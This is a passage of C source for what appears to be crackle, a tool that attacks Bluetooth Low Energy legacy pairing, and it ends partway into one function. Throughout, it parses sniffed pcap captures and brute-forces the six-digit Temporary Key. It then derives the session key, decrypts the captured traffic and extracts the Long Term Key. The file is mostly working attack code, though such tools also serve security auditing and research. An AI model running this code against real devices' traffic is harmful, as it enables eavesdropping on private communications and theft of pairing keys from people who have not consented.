#include <assert.h>
#include <ctype.h>
#include <err.h>
#include <getopt.h>
#include <stdint.h>
#include <string.h>

#include <sys/param.h>
#ifdef BSD
#ifdef __APPLE__
# include <libkern/OSByteOrder.h>

# define htobe16(x) OSSwapHostToBigInt16(x)
# define htole16(x) OSSwapHostToLittleInt16(x)
# define be16toh(x) OSSwapBigToHostInt16(x)
# define le16toh(x) OSSwapLittleToHostInt16(x)

# define htobe32(x) OSSwapHostToBigInt32(x)
# define htole32(x) OSSwapHostToLittleInt32(x)
# define be32toh(x) OSSwapBigToHostInt32(x)
# define le32toh(x) OSSwapLittleToHostInt32(x)

# define htobe64(x) OSSwapHostToBigInt64(x)
# define htole64(x) OSSwapHostToLittleInt64(x)
# define be64toh(x) OSSwapBigToHostInt64(x)
# define le64toh(x) OSSwapLittleToHostInt64(x)

# define __BYTE_ORDER    BYTE_ORDER
# define __BIG_ENDIAN    BIG_ENDIAN
# define __LITTLE_ENDIAN LITTLE_ENDIAN
# define __PDP_ENDIAN    PDP_ENDIAN
#else
# include <sys/endian.h> // needed for byte swapping
#endif
#endif

#include "aes.h"
#include "crackle.h"

#define PFH_BTLE (30006)
#define BLUETOOTH_LE_LL_WITH_PHDR 256
#define NORDIC_BLE_SNIFFER_META 157
#define NORDIC_BLE 272
#define PPI 192

// CACE PPI headers
typedef struct ppi_packetheader {
    uint8_t pph_version;
    uint8_t pph_flags;
    uint16_t pph_len;
    uint32_t pph_dlt;
} __attribute__((packed)) ppi_packet_header_t;

typedef struct ppi_fieldheader {
    u_int16_t pfh_type;       /* Type */
    u_int16_t pfh_datalen;    /* Length of data */
} ppi_fieldheader_t;

typedef struct ppi_btle {
    uint8_t btle_version; // 0 for now
    uint16_t btle_channel;
    uint8_t btle_clkn_high;
    uint32_t btle_clk100ns;
    int8_t rssi_max;
    int8_t rssi_min;
    int8_t rssi_avg;
    uint8_t rssi_count;
} __attribute__((packed)) ppi_btle_t;


typedef struct _pcap_bluetooth_le_ll_header {
    uint8_t rf_channel;
    int8_t signal_power;
    int8_t noise_power;
    uint8_t access_address_offenses;
    uint32_t ref_access_address;
    uint16_t flags;
    uint8_t le_packet[0];
} __attribute__((packed)) pcap_bluetooth_le_ll_header;

typedef struct _pcap_nordic_ble_sniffer_meta {
    uint32_t board;
    uint32_t uart_packets_count;
    uint8_t flags;
    uint8_t channel;
    int8_t rssi;
    uint16_t event_counter;
    uint32_t delta_time;
} __attribute__((packed)) pacp_nordic_ble_sniffer_meta_t;


/* misc definitions */
void run_tests(void);

// connection state handling
connection_state_t *new_connection_state(crackle_state_t *state);
void free_connection_state(crackle_state_t *state);


uint8_t read_8(const u_char *bytes) {
    return *bytes;
}

uint16_t read_16(const u_char *bytes) {
    uint16_t r = *(uint16_t *)bytes;
    return le16toh(r);
}

uint32_t read_32(const u_char *bytes) {
    uint32_t r = *(uint32_t *)bytes;
    return le32toh(r);
}

void read_48(const u_char *bytes, uint8_t *dest) {
    int i;
    for (i = 0; i < 6; ++i)
        dest[i] = bytes[5-i];
}

void print_48(uint8_t *val) {
    int i;
    for (i = 0; i < 5; ++i)
        printf("%02x:", val[i]);
    printf("%02x", val[5]);
}

void dump_blob(uint8_t *data, size_t len) {
    unsigned i;
    for (i = 0; i < len; ++i) printf(" %02x", data[i]);
    printf("\n");
}

void copy_reverse(const u_char *bytes, uint8_t *dest, size_t len) {
    unsigned i;
    for (i = 0; i < len; ++i)
        dest[i] = bytes[len - 1 - i];
}

static void add_encrypted_packet(connection_state_t *conn, unsigned pcap_idx,
        uint8_t flags, const uint8_t *data, size_t data_len) {
    unsigned current_packet;
    encrypted_packet_t *packet;

    if (conn->packets == NULL) {
        conn->packets = malloc(sizeof(encrypted_packet_t) * 4);
        conn->packets_size = 4;
        memset(conn->packets, 0, sizeof(encrypted_packet_t) * 4);
    }

    current_packet = conn->num_packets++;
    if (current_packet >= conn->packets_size) {
        conn->packets_size *= 2;
        conn->packets = realloc(conn->packets,
                sizeof(encrypted_packet_t) * conn->packets_size);
        memset(conn->packets + current_packet, 0,
                sizeof(encrypted_packet_t) * (conn->packets_size - current_packet));
    }

    packet = &conn->packets[current_packet];
    packet->pcap_idx = pcap_idx;
    packet->flags = flags;
    packet->enc_data = malloc(data_len);
    memcpy(packet->enc_data, data, data_len);
    packet->enc_data_len = data_len;
}

/*
 * PCAP handler for stuffing data into the master state. This will allocate
 * connections, grab the pairing packets, and make a copy of all encrypted
 * packets it sees.
 */
static void enc_data_extractor(crackle_state_t *crackle_state,
                               const struct pcap_pkthdr *h,
                               const u_char *bytes,
                               off_t offset,
                               size_t len) {
    const uint32_t adv_aa = 0x8e89bed6;
    uint32_t aa;
    unsigned pcap_idx;
    connection_state_t *state = NULL;

    assert(crackle_state != NULL);
    assert(offset < len);

    pcap_idx = crackle_state->pcap_idx++;

    // grab the last connection
    state = &crackle_state->conn[crackle_state->current_conn];

    bytes += offset;
    len -= offset;

    // short packet, must have at least AA + flags + ll len
    if (len < 6)
        return;

    aa = read_32(bytes);

    if (aa == adv_aa) {
        uint8_t flags = read_8(bytes + 4);
        uint16_t lllen = read_8(bytes + 5) & 0x3f;

        // ensure capture is at least as large as LL len + AA + header + CRC
        if (len < lllen + 6 + 3)
            return;

        // connect packet, grab those addresses!
        if ((flags & 0xf) == 5) {
            // another short packet
            if (lllen != 34)
                return;

            if (state->connect_found)
                // allocate a new connection
                state = new_connection_state(crackle_state);

            state->connect_found = 1;

            state->aa = read_32(bytes + 18);
            read_48(bytes + 6, state->ia);
            read_48(bytes + 12, state->ra);
            state->iat = (flags & 0x40) ? 1 : 0;
            state->rat = (flags & 0x80) ? 1 : 0;
        }
    }

    // data packet
    else {
        uint8_t flags = read_8(bytes + 4);
        uint8_t lllen = read_8(bytes + 5);

        // ensure capture is at least as large as LL len + AA + header + CRC
        if (len < lllen + 6 + 3)
            return;

        // encrypted data: copy into state data structure
        if (state->start_enc_req_found) {
            if (lllen > 0 && lllen < 5)
                printf("Warning: packet is too short to be encrypted (%u), "
                       "skipping\n", lllen);
            if (lllen >= 5)
                add_encrypted_packet(state, pcap_idx, flags, bytes + 6, lllen);
        }

        // unencrypted data, grab the relevant headers
        else {
            if ((flags & 0x3) == 2) {
                uint16_t l2len;
                uint16_t cid;

                // must be at least long enough for L2CAP header
                if (lllen < 4)
                    return;

                l2len = read_16(bytes + 6);
                cid = read_16(bytes + 8);

                // Bluetooth Security Manager
                if (cid == 6) {
                    uint8_t command;

                    if (len < 11)
                        return;

                    command = read_8(bytes + 10);

                    // pairing request, copy it
                    if (command == 0x1) {
                        if (state->preq_found)
                            printf("Warning: found multiple pairing requests, only using the latest one\n");
                        if (l2len != 7) {
                            printf("Warning: pairing request is wrong length (%u), skipping\n", l2len);
                            return;
                        }
                        copy_reverse(bytes + 10, state->preq, 7);
                        state->preq_found = 1;
                    }

                    // pairing response, copy it
                    else if (command == 0x2) {
                        if (state->pres_found)
                            printf("Warning: found multiple pairing responses, only using the latest one\n");
                        if (l2len != 7) {
                            printf("Warning: pairing response is wrong length (%u), skipping\n", l2len);
                            return;
                        }
                        copy_reverse(bytes + 10, state->pres, 7);
                        state->pres_found = 1;
                    }

                    // pairing confirm, copy the confirm value
                    else if (command == 0x3) {
                        uint8_t confirm[16];

                        if (l2len != 17) {
                            printf("Warning: confirm is wrong length (%u), skipping\n", l2len);
                            return;
                        }

                        copy_reverse(bytes + 11, confirm, 16);

                        // detect retransmissions
                        if (state->confirm_found == 1 && memcmp(state->mconfirm, confirm, 16) == 0) {
                            printf("Warning: duplicate confirm found, skipping\n");
                            return;
                        }

                        if (state->confirm_found >= 2) {
                            printf("Warning: already saw two confirm values, skipping\n");
                            return;
                        }
                        uint8_t *dest = state->confirm_found == 0 ? state->mconfirm : state->sconfirm;
                        memcpy(dest, confirm, 16);
                        ++state->confirm_found;
                    }

                    // pairing random, copy the random value
                    else if (command == 0x4) {
                        uint8_t rand[16];

                        if (l2len != 17) {
                            printf("Warning: random is wrong length (%u), skipping\n", l2len);
                            return;
                        }

                        copy_reverse(bytes + 11, rand, 16);

                        // detect retransmissions
                        if (state->random_found == 1 && memcmp(state->mrand, rand, 16) == 0) {
                            printf("Warning: duplicate random found, skipping\n");
                            return;
                        }
                        if (state->random_found >= 2) {
                            printf("Warning: already saw two random values, skipping\n");
                            return;
                        }
                        uint8_t *dest = state->random_found == 0 ? state->mrand : state->srand;
                        memcpy(dest, rand, 16);
                        ++state->random_found;
                    }

                    // pairing public key -- LE Secure Connections
                    else if (command == 0xc) {
                        state->pairing_public_key_found = 1;
                        // TODO - maybe in future, copy this out and check for
                        // use of debug key
                        // (refer to 4.2 Vol 3 Part H Sec 2.3.5.6.1)
                    }

                    // pairing DHkey check -- LE Secure Connections
                    else if (command == 0xd) {
                        state->pairing_dhkey_check_found = 1;
                    }
                }
            }

            // LL Control PDU
            else if ((flags & 3) == 3) {
                uint8_t opcode;

                if (len < 7)
                    return;

                opcode = read_8(bytes + 6);

                // LL_ENC_REQ
                if (opcode == 0x3) {
                    if (state->enc_req_found)
                        printf("Warning: found multiple LL_ENC_REQ, only using latest one\n");
                    if (lllen != 23) {
                        printf("Warning: LL_ENC_REQ is wrong length (%u), skipping\n", lllen);
                        return;
                    }
                    copy_reverse(bytes +  7, state->rand, 8);
                    copy_reverse(bytes + 15, state->ediv, 2);
                    copy_reverse(bytes + 17, state->skdm, 8);
                    copy_reverse(bytes + 25, state->ivm,  4);
                    state->enc_req_found = 1;
                }

                // LL_ENC_RSP
                else if (opcode == 0x4) {
                    if (state->enc_rsp_found)
                        printf("Warning: found multiple LL_ENC_RSP, only using latest one\n");
                    if (lllen != 13) {
                        printf("Warning: LL_ENC_RSP is wrong length (%u), skipping\n", lllen);
                        return;
                    }
                    copy_reverse(bytes +  7, state->skds, 8);
                    copy_reverse(bytes + 15, state->ivs,  4);
                    state->enc_rsp_found = 1;
                }

                // LL_START_ENC_REQ
                else if (opcode == 0x5) {
                    state->start_enc_req_found = 1;
                }
            }
        }
    }
}

/*
 * PCAP packet handler for copying decrypted data out to a PCAP file. Be sure to
 * preprocess the encrypted data using preprocess_decrypted before calling this
 * function. If this is called when there are no decrypted packets to dump, some
 * assertions will fail, so don't do that.
 */
static void packet_decrypter(crackle_state_t *state,
                             const struct pcap_pkthdr *h,
                             const u_char *bytes_in,
                             off_t offset,
                             size_t len_in) {
    unsigned pcap_idx;
    encrypted_packet_t *packet = NULL;
    uint8_t *write_data = NULL;
    struct pcap_pkthdr wh = *h; // copy from input

    assert(state != NULL);
    assert(state->all_decrypted != NULL);
    assert(state->dec_idx <= state->total_decrypted);

    pcap_idx = state->pcap_idx++;

    if (state->dec_idx < state->total_decrypted)
        packet = &state->all_decrypted[state->dec_idx];

    if (packet && pcap_idx > packet->pcap_idx) {
        printf("Bug in decrypter, please report!\n");
        abort();
    }

    // decrypted packet encountered, write that out
    if (packet && pcap_idx == packet->pcap_idx) {
        size_t new_len = packet->dec_data_len;

        assert(packet->dec_data != NULL && new_len > 0 && new_len < 256);
        assert(wh.len == offset + 6 + new_len + 4 + 3);

        ++state->dec_idx;

        write_data = malloc(wh.len - 3);
        memcpy(write_data, bytes_in, offset + 6); // pull all headers

        // set CRC to 000000 -- FIXME recalculate this value
        memset(write_data + offset + 6 + new_len, 0, 3);

        // copy in decrypted data
        memcpy(write_data + offset + 6, packet->dec_data, new_len);
        write_data[offset + 5] = new_len; // adjust LL header length

        // remove MIC length from packet
        wh.len -= 4;
        wh.caplen -= 4;

        pcap_dump((unsigned char *)state->dumper, &wh, write_data);
        free(write_data);
    }

    // copy data straight across otherwise
    else {
        pcap_dump((unsigned char *)state->dumper, &wh, bytes_in);
    }

    ++state->total_processed;
}

void packet_handler_ble_phdr(u_char *user, const struct pcap_pkthdr *h, const u_char *bytes) {
    crackle_state_t *state;
    state = (crackle_state_t *)user;
    size_t header_len = sizeof(pcap_bluetooth_le_ll_header);

    state->btle_handler(state, h, bytes, header_len, h->caplen);
}

void packet_handler_ppi(u_char *user, const struct pcap_pkthdr *h, const u_char *bytes) {
    crackle_state_t *state;
    size_t header_len;
    ppi_packet_header_t *ppih;
    ppi_fieldheader_t *ppifh;
    ppi_btle_t *ppib;

    assert(user != NULL);
    state = (crackle_state_t *)user;

    // sanity checks below!
    header_len = sizeof(*ppih) + sizeof(*ppifh) + sizeof(*ppib);
    if (h->caplen < header_len) {
        printf("caplen %u, header_len %zu\n", h->caplen, header_len);
        printf("Warning: short packet, skipping\n");
        return;
    }

    ppih  = (ppi_packet_header_t *)bytes;
    if (ppih->pph_dlt != DLT_USER0 && ppih->pph_dlt != DLT_BLUETOOTH_LE_LL) {
        printf("Warning: unknown packet type encountered, skipping\n");
        return;
    }

    ppifh = (ppi_fieldheader_t *)(bytes + sizeof(*ppih));
    if (ppifh->pfh_type != PFH_BTLE) {
        printf("Warning: BTLE DLT found, but it doesn't have a BTLE header\n");
        return;
    }
    if (ppifh->pfh_datalen != sizeof(*ppib)) {
        printf("Warning: BTLE DLT with BTLE header, but header length is wrong\n");
        return;
    }

    ppib  = (ppi_btle_t *)(bytes + sizeof(*ppih) + sizeof(*ppifh));

    // whew, now that we've got all that out of the way onto the parsing
    state->btle_handler(state, h, bytes, header_len, h->caplen);
}

void packet_handler_nordic(u_char *user, const struct pcap_pkthdr *h, const u_char *bytes) {
    crackle_state_t *state;
    state = (crackle_state_t *)user;
    size_t header_len = sizeof(pacp_nordic_ble_sniffer_meta_t);
    state->btle_handler(state, h, bytes, header_len, h->caplen);
}

/*
 * Do AES on the 16 byte block of data.
 */
void aes_block(uint8_t *key, uint8_t *data, uint8_t *out) {
    void *aes_ctx = aes_encrypt_init(key, 16);
    aes_encrypt(aes_ctx, data, out);
    aes_encrypt_deinit(aes_ctx);
}

/*
 * Calculate the confirm according to the core spec.
 *
 *  master: true if you want to calculate the master's confirm, false for slave's
 *  numeric_key: value between 0 and 999,999 (use 0 for Just Works)
 *  out: 16 byte buffer for storing the output
 */
void calc_confirm(connection_state_t *state, int master, uint32_t numeric_key, uint8_t *out) {
    int i;
    uint8_t p1[16] = { 0, };
    uint8_t p2[16] = { 0, };
    uint8_t key[16] = { 0, };
    uint8_t *rand = master ? state->mrand : state->srand;

    numeric_key = htobe32(numeric_key);
    memcpy(&key[12], &numeric_key, 4);

    // p1 = pres || preq || rat || iat
    memcpy(p1 +  0, state->pres, 7);
    memcpy(p1 +  7, state->preq, 7);
    p1[14] = state->rat;
    p1[15] = state->iat;

    // p2 = padding || ia || ra
    memcpy(p2 +  4, state->ia, 6);
    memcpy(p2 + 10, state->ra, 6);

    for (i = 0; i < 16; ++i)
        p1[i] ^= rand[i];

    aes_block(key, p1, out);

    for (i = 0; i < 16; ++i)
        p1[i] = out[i] ^ p2[i];

    aes_block(key, p1, out);
}

void calc_stk(connection_state_t *state, uint32_t numeric_key) {
    uint8_t rand[16];

    assert(state != NULL);

    // calculate TK
    numeric_key = htobe32(numeric_key);
    memcpy(&state->tk[12], &numeric_key, 4);

    // STK = s1(TK, Srand, Mrand) [pg 1971]
    // concatenate the lower 8 octets of Srand and MRand
    memcpy(rand + 0, state->srand + 8, 8);
    memcpy(rand + 8, state->mrand + 8, 8);

    aes_block(state->tk, rand, state->stk);
}

void calc_session_key(connection_state_t *state) {
    uint8_t skd[16];

    assert(state != NULL);

    // SKD = SKDm || SKDs [pg 2247]
    memcpy(skd + 0, state->skds, 8);
    memcpy(skd + 8, state->skdm, 8);

    // sesion key = e(STK, SKD)
    aes_block(state->stk, skd, state->session_key);
}

void calc_iv(connection_state_t *state) {
    assert(state != NULL);

    copy_reverse(state->ivm, state->iv + 0, 4);
    copy_reverse(state->ivs, state->iv + 4, 4);
}

void dump_state(crackle_state_t *state) {
    int i, count = 0;
    connection_state_t *conn;

    assert(state != NULL);

    for (count = 0; count <= state->current_conn; ++count) {
        conn = &state->conn[count];

        printf("Connection %d\n", count);

        printf("  connect_found: %d\n", conn->connect_found);
        printf("  preq_found: %d\n", conn->preq_found);
        printf("  pres_found: %d\n", conn->pres_found);
        printf("  confirm_found: %d\n", conn->confirm_found);
        printf("  random_found: %d\n", conn->random_found);
        printf("  enc_req_found: %d\n", conn->enc_req_found);
        printf("  enc_rsp_found: %d\n", conn->enc_rsp_found);
        printf("  pairing_public_key_found: %d\n", conn->pairing_public_key_found);
        printf("  pairing_dhkey_check_found: %d\n", conn->pairing_dhkey_check_found);

        if (conn->connect_found) {
            printf("  AA: %08x\n", conn->aa);
            printf("  IA: ");
            print_48(conn->ia);
            printf("\n  RA: ");
            print_48(conn->ra);
            printf("\n  IAt: %d\n", conn->iat);
            printf("  RAt: %d\n", conn->rat);
        }

        if (conn->preq_found) {
            printf("  PREQ:");
            dump_blob(conn->preq, 7);
        }

        if (conn->pres_found) {
            printf("  PRES:");
            dump_blob(conn->pres, 7);
        }

        for (i = 0; i < conn->confirm_found; ++i) {
            printf("  %cCONFIRM:", i == 0 ? 'M' : 'S');
            dump_blob(i == 0 ? conn->mconfirm : conn->sconfirm, 16);
        }

        for (i = 0; i < conn->random_found; ++i) {
            printf("  %cRAND:", i == 0 ? 'M' : 'S');
            dump_blob(i == 0 ? conn->mrand : conn->srand, 16);
        }

        if (conn->enc_req_found) {
            printf("  Rand:");
            dump_blob(conn->rand, 8);
            printf("  EDIV:");
            dump_blob(conn->ediv, 2);
            printf("  SKDm:");
            dump_blob(conn->skdm, 8);
            printf("  IVm: ");
            dump_blob(conn->ivm, 4);
        }

        if (conn->enc_rsp_found) {
            printf("  SKDs:");
            dump_blob(conn->skds, 8);
            printf("  IVs: ");
            dump_blob(conn->ivs, 4);
        }
    }
}

// get a new connection state
// allocates space if necessary and zeros any new allocation
connection_state_t *new_connection_state(crackle_state_t *state) {
    assert(state != NULL);

    // initial call: allocate four and return
    if (state->total_conn == 0) {
        assert(state->current_conn == 0);
        assert(state->conn == NULL);

        state->total_conn = 4;
        state->conn = malloc(sizeof(connection_state_t) * state->total_conn);
        memset(state->conn, 0, sizeof(connection_state_t) * state->total_conn);
    }

    else {
        state->current_conn += 1;
        if (state->current_conn >= state->total_conn) {
            state->total_conn *= 2;
            state->conn = realloc(state->conn,
                    sizeof(connection_state_t) * state->total_conn);

            memset(&state->conn[state->current_conn], 0,
                    sizeof(connection_state_t) *
                      (state->total_conn - state->current_conn));
        }
    }

    return &state->conn[state->current_conn];
}

// free the array of connection states
void free_state(crackle_state_t *state) {
    unsigned i, j;
    connection_state_t *conn;

    free(state->all_decrypted);

    for (i = 0; i < state->total_conn; ++i) {
        conn = &state->conn[i];
        for (j = 0; j < conn->num_packets; ++j) {
            free(conn->packets[j].enc_data);
            free(conn->packets[j].dec_data);
        }
        free(conn->packets);
    }

    free(state->conn);

    // apparently pcap_dump_close isn't smart enough to deal with NULL
    if (state->dumper != NULL)
        pcap_dump_close(state->dumper);
}

// analyzes if a connection can be cracked and returns strategy
// if strategy 0 or 1, bits of entropy is returned in *bits
// if cannot be cracked, returns -1 and stores error messages in errors
//      max of 4 errors - see ANALYZE_MAX_ERRORS
//
// return values:
//  -1 - cannot be cracked
//   0 - strategy 0, minimal 20 bit brute force
//   1 - strategy 1, 21 - 33 bits of brute force
//   2 - strategy 2, very slow brute force of STK
#define ANALYZE_MAX_ERRORS 4
int analyze_connection(connection_state_t *state, int *bits,
        char **errors, int *num_errors) {
    *num_errors = 0;

    // pre-check for LE Secure Connections
    if (state->pairing_public_key_found ||
            state->pairing_dhkey_check_found) {
        errors[(*num_errors)++] = "LE Secure Connections";
        return -1;
    }

    // absolutely required:
    //  CONNECT_REQ
    //  Mrand and Srand
    //  LL_ENC_REQ
    //  LL_ENC_RSP
    if (!state->connect_found)
        errors[(*num_errors)++] = "CONNECT_REQ not found";

    if (state->random_found == 0)
        errors[(*num_errors)++] = "Missing both Mrand and Srand";

    if (state->random_found == 1)
        errors[(*num_errors)++] = "Missing one of Mrand and Srand";

    if (!state->enc_req_found)
        errors[(*num_errors)++] = "Missing LL_ENC_REQ";

    if (!state->enc_rsp_found)
        errors[(*num_errors)++] = "Missing LL_ENC_RSP";

    // if we're missing any of those, give up
    if (*num_errors > 0)
        return -1;

    // if we have zero confirms, we have to brute force STK
    if (state->confirm_found == 0)
        return 2;

    // otherwise we're doing strategy 0 or 1, 20 - 33 bits of entropy
    *bits = 20;

    if (state->confirm_found == 1)
        *bits += 1;

    if (!state->preq_found)
        *bits += 6;

    if (!state->pres_found)
        *bits += 6;

    return *bits == 20 ? 0 : 1;
}

int crack_strategy0(connection_state_t *state);
int crack_strategy1(connection_state_t *state);
int crack_strategy2(connection_state_t *state, int verbose);

void decrypt(connection_state_t *state);

/*
 * The workhorse: analye all the extracted data, and for each connection
 * determine the appropriate cracking strategy. Actually attempt to crack the TK
 * and decrypt data for any connection for which that is possible. Populates the
 * connection_state_t data structure with decrypted packet data and metadata
 * about how many packets were decrypted.
 */
void do_crack(crackle_state_t *state, int force_strategy) {
    int i;
    connection_state_t *conn;
    int num_connections = state->current_conn + 1;
    int tk = -1;

    printf("Found %d connection%s\n", num_connections,
            num_connections == 1 ? "" : "s");

    for (i = 0; i <= state->current_conn; ++i) {
        int strategy;
        int bits = 0;
        char *errors[ANALYZE_MAX_ERRORS] = { NULL, };
        int num_errors = 0;

        conn = &state->conn[i];
        printf("\nAnalyzing connection %d:\n", i);
        if (conn->connect_found) {
            printf("  ");
            print_48(conn->ia);
            printf(" (%s) -> ", conn->iat == 0 ? "public" : "random");
            print_48(conn->ra);
            printf(" (%s)\n", conn->rat == 0 ? "public" : "random");
        }
        printf("  Found %d encrypted packet%s\n", conn->num_packets,
                conn->num_packets == 1 ? "" : "s");

        strategy = analyze_connection(conn, &bits, errors, &num_errors);

        if (strategy < 0) {
            int j;
            printf("  Unable to crack due to the following error%s:\n",
                    num_errors == 1 ? "" : "s");
            for (j = 0; j < num_errors; ++j)
                printf("    %s\n", errors[j]);

            continue;
        }

        // FIXME - use strategy 1 when it's implemented
        if (strategy == 1)
            strategy = 2;

        // Override if told so
        if (force_strategy >= 0)
            strategy = force_strategy;

        // we're definitely cracking
        if (strategy == 0 || strategy == 1) {
            printf("  Cracking with strategy %d, %d bits of entropy\n",
                    strategy, bits);
            if (strategy == 0) {
                tk = crack_strategy0(conn);
            } else {
                tk = crack_strategy1(conn);
            }
        }

        // strategy 2 decrypts while discovering the TK
        if (strategy == 2) {
            printf("  Cracking with strategy 2, slow STK brute force\n");
            tk = crack_strategy2(conn, state->verbose);
        }

        if (tk >= 0) {
            int j;

            printf("\n  !!!\n");
            printf("  TK found: %06d\n", tk);
            if (tk == 0)
                printf("  ding ding ding, using a TK of 0! Just Cracks(tm)\n");
            printf("  !!!\n\n");

            // see above: strategy 2 decrypts while discovering the TK, but
            // strategies 1 and 2 do not. Thus we need to do the decrypting down
            // here.
            if (strategy == 0 || strategy == 1) {
                calc_iv(conn);
                calc_stk(conn, tk);
                calc_session_key(conn);
                if (state->verbose) {
                    printf("  STK: ");
                    for (j = 0; j < 16; ++j)
                        printf("%02x", conn->stk[j]);
                    printf("\n");
                }

                decrypt(conn);
            }

            printf("  Decrypted %u packet%s\n", conn->decrypted_packets,
                    conn->decrypted_packets == 1 ? "" : "s");
            if (conn->ltk_found) {
                printf("  LTK found: ");
                for (j = 0; j < 16; ++j)
                    printf("%02x", conn->ltk[j]);
                printf("\n");
            }

            state->total_decrypted += conn->decrypted_packets;
        } else {
            printf("    TK is not found. The connection could be using OOB pairing or something\n");
            printf("    else fishy is going on. File a bug with more info about the devices.\n");
            printf("    Sorry d00d :(\n");
        }
    }
}

/*
 * Crack the TK using strategy 0: calculate master confirm for all
 * possible TK values and compare to master confirm received over the
 * air.
 *
 * Returns:
 *  -1: crack failed
 *  0 - 999,999: the cracked TK
 */
int crack_strategy0(connection_state_t *state) {
    int r = -1, tk_found = 0;
    int numeric_key;
    uint8_t confirm_mrand[16] = { 0, };

    // crack TK by comparing the Confirm Pairing retrieved values with the confirm values
    // computed with the confirm value generation function c1 (page 1962, BT 4.0 spec)

    // brute force the TK, starting with 0 for Just Works
    for (numeric_key = 0; numeric_key <= 999999; numeric_key++) {
        calc_confirm(state, 1, numeric_key, confirm_mrand);
        r  = memcmp(state->mconfirm, confirm_mrand, 16) == 0;
        // just in case the other confirm was master's
        r |= memcmp(state->sconfirm, confirm_mrand, 16) == 0;
        if (r) {
            tk_found = 1;
            break;
        }
    }

    return tk_found ? numeric_key : -1;
}

/*
 * TODO - implement this strategy
 *
 * If we have at least one confirm value (in addition to other required packets)
 * we can brute force some of the missing packets. Missing packets add the
 * following entropy to the brute force:
 *
 * Missing confirm: 1 bit
 * Missing LL_ENC_REQ: 6 bits
 * Missing LL_ENC_RSP: 6 bits
 *
 * This adds a max of 13 bits of entropy on top of the 20 bits for the TK
 * itself. It remains to be seen if this is faster than brute forcing every
 * possible STK (strategy 2).
 *
 * Returns:
 *  -1: crack failed
 *  0 - 999,999: the cracked TK
 */
int crack_strategy1(connection_state_t *state) {
    printf("    Warning: not yet implemented\n");
    return -1;
}

/*
 * Crack the TK by calculating all possible STK values and using those to
 * attempt to decrypt data. This is considerably slower than brute forcing the
 * TK using the key exchange data, but it's still feasible in reasonable time on
 * a single core.
 *
 * TODO - parallelize this
 *
 * Returns:
 *  -1: crack filed
 *  0 - 999,999: the cracked TK
 */
int crack_strategy2(connection_state_t *state, int verbose) {
    int tk_found = 0, numeric_key;
    int final_tk = 0;

    calc_iv(state);
    for (numeric_key = 0; numeric_key <= 999999; numeric_key++) {
        if (tk_found) continue;

        if (verbose && numeric_key % 1000 == 0)
            printf("  Trying TK: %06d\n", numeric_key);

        calc_stk(state, numeric_key);
        calc_session_key(state);

        decrypt(state);
        if (state->decrypted_packets > 0) {
            tk_found = 1;
            final_tk = numeric_key;
        }
    }

    return tk_found ? final_tk : -1;
}

/*
 * Attempt to decrypt encrypted packets for a given connection. This assumes the
 * IV, STK, and session key have been calculated. It can also be called using
 * the user-given LTK in place of the STK for LTK decrypt mode.
 *
 * Upon successfully decrypting data, it populates the decrypted packet data
 * field and updates the decrypted_packets field of the connection_state.
 */
void decrypt(connection_state_t *state) {
    unsigned packet_count;
    uint64_t packet_counter[2] = {0, 0}; // 0: master, 1: slave

    for (packet_count = 0; packet_count < state->num_packets; ++packet_count) {
        int r, i, j;
        encrypted_packet_t *packet = &state->packets[packet_count];
        size_t len = packet->enc_data_len;
        uint8_t out[256];
        uint8_t adata[16] = { packet->flags & 0xe3, 0x00, };
        uint8_t nonce[16];
        uint8_t *crypted;
        const uint8_t *mic;

        assert(len >= 5);

        // pull the MIC off the end
        len -= 4;
        mic = packet->enc_data + len;

        // the AES-CCM imlpementation accesses this buffer up to the next
        // highest multiple of 16 bytes, so malloc a slighly larger buffer
        crypted = malloc((len / 16 + 1) * 16);
        memset(crypted, 0, (len / 16 + 1) * 16);
        memcpy(crypted, packet->enc_data, len);

        for (i = 0; i < 100; ++i) {
            for (j = 0; j < 2; ++j) {
                uint64_t counter = packet_counter[j] + i;
                uint64_t counter_le = htole64(counter);

                memcpy(nonce, &counter_le, 5);      // 39 bit counter
                nonce[4] |= j == 0 ? 0x80 : 0x00;   // direction bit: set for master -> slave
                memcpy(nonce + 5, state->iv, 8);

                r = aes_ccm_ad(state->session_key, 16, nonce, 4,
                               crypted, len, adata, 1,
                               mic, out);
                if (r == 0) {
                    // copy length
                    packet->dec_data_len = len;

                    // allocate and copy data
                    packet->dec_data = malloc(len);
                    memcpy(packet->dec_data, out, len);

                    ++state->decrypted_packets;
                    packet_counter[j] = counter + 1;

                    // check for LTK
                    if ( (packet->flags & 0x03) == 2 && // L2CAP data
                            len == 21 &&                // 21 bytes long
                            packet->dec_data[2] == 6 && // security manager
                            packet->dec_data[4] == 6) { // encryption info
                        state->ltk_found = 1;
                        copy_reverse(&packet->dec_data[5], state->ltk, 16);
                    }
                    goto out;
                }
            }
        }
out:

        free(crypted);
    }
}

void ltk_decrypt(crackle_state_t *state, uint8_t *ltk_bytes) {
    int i, j;
    connection_state_t *conn;
    int num_connections = state->current_conn + 1;

    printf("Found %d connection%s\n", num_connections,
            num_connections == 1 ? "" : "s");

    for (i = 0; i <= state->current_conn; ++i) {
        char *errors[ANALYZE_MAX_ERRORS] = { NULL, };
        int num_errors = 0;

        conn = &state->conn[i];
        printf("\nAnalyzing connection %d:\n", i);
        if (conn->connect_found) {
            printf("  ");
            print_48(conn->ia);
            printf(" (%s) -> ", conn->iat == 0 ? "public" : "random");
            print_48(conn->ra);
            printf(" (%s)\n", conn->rat == 0 ? "public" : "random");
        }

        if (!conn->enc_req_found)
        errors[num_errors++] = "Missing LL_ENC_REQ";

        if (!conn->enc_rsp_found)
        errors[num_errors++] = "Missing LL_ENC_RSP";

        // the code flows weird, but this matches the TK crack output
        printf("  Found %d encrypted packet%s\n", conn->num_packets,
                conn->num_packets == 1 ? "" : "s");

        if (num_errors > 0) {
            printf("  Unable to decrypt due to the following error%s:\n",
                    num_errors == 1 ? "" : "s");
            for (j = 0; j < num_errors; ++j)
                printf("    %s\n", errors[j]);
            continue;
        }

        calc_iv(conn);
        memcpy(conn->stk, ltk_bytes, 16);
        calc_session_key(conn);

        decrypt(conn);

        printf("  Decrypted %u packet%s\n", conn->decrypted_packets,
                conn->decrypted_packets == 1 ? "" : "s");
        if (conn->ltk_found) {
            printf("  LTK found (again?): ");
            for (j = 0; j < 16; ++j)
                printf("%02x", conn->ltk[j]);
            printf("\n");
        }

        state->total_decrypted += conn->decrypted_packets;
    }
}

/*
 * Preprocess decrypted packets before writing them out to PCAP. This collects
 * all the decrypted packets from each connection into one master data structure
 * that can be iterated easily in the PCAP packet handler (refer to
 * packet_decrypter).
 */
void preprocess_decrypted(crackle_state_t *state) {
    int i, j, dec = 0;
